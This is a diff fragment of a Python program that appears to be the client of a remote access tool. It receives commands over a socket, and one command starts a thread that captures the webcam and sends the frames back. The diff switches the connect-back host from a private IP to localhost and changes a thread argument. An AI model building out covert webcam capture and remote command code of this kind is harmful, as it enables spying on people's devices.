@@ -206,7 +206,7 @@ def receive_commands(sock):
                 elif command_type == 'WEBCAM':
                     if webcam_thread is None or not webcam_thread.is_alive():
                         stop_cam_signal.clear()
-                        webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock, stop_cam_signal))
+                        webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock,))
                         webcam_thread.start()
                     else:
                         stop_cam_signal.set()
@@ -252,7 +252,7 @@ def receive_commands(sock):
 # Main function
 def main():
     global stop
-    host = '172.20.10.4'
+    host = 'localhost'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
     current_date = datetime.datetime.now().strftime("%d%m%Y")
